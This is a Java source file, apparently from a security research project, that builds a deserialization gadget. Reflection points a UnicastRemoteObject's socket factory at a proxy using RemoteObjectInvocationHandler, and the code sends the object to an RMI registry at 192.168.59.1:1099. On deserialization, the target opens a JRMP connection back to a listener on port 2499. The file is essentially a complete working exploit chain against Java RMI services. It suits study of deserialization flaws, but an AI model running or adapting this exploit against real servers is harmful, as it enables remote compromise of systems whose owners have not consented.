package com.dem0.vuln;

import com.dem0.internal.ReflectUtils;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

import java.lang.reflect.Constructor;
import java.lang.reflect.Proxy;
import java.rmi.server.ObjID;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.UnicastRemoteObject;
import java.util.Random;

import static com.dem0.rmi.Main.sendRawCall;
import static com.dem0.utils.Reflections.setFieldValue;

public class TriggerJRMPCallByDeserialize {
    public static void main(String[] args) throws Exception{
        String registryHost = "192.168.59.1";
        int registryPort = 1099;
        String JRMPHost = "192.168.59.1";
        int JRMPPort = 2499;

        TCPEndpoint te = new TCPEndpoint(JRMPHost, JRMPPort);
        ObjID id = new ObjID(new Random().nextInt());
        UnicastRef refObject = new UnicastRef(new LiveRef(id, te, false));

        //触发关键在于RemoteObjectInvocationHandler的invoke方法
        RemoteObjectInvocationHandler myInvocationHandler = new RemoteObjectInvocationHandler(refObject);
        RMIServerSocketFactory handcraftedSSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
                RMIServerSocketFactory.class.getClassLoader(),
                new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
                myInvocationHandler);


        Constructor<?> constructor = UnicastRemoteObject.class.getDeclaredConstructor(null);
        constructor.setAccessible(true);
        UnicastRemoteObject remoteObject = (UnicastRemoteObject) constructor.newInstance(null);

        setFieldValue(remoteObject, "ssf", handcraftedSSF);

        byte[] serializeData =  ReflectUtils.WriteObjectToBytes(remoteObject);

        ReflectUtils.readObjectFromBytes(serializeData);
        sendRawCall(registryHost,registryPort,new ObjID(0),0,4905912898345647071L,remoteObject);
    }
}
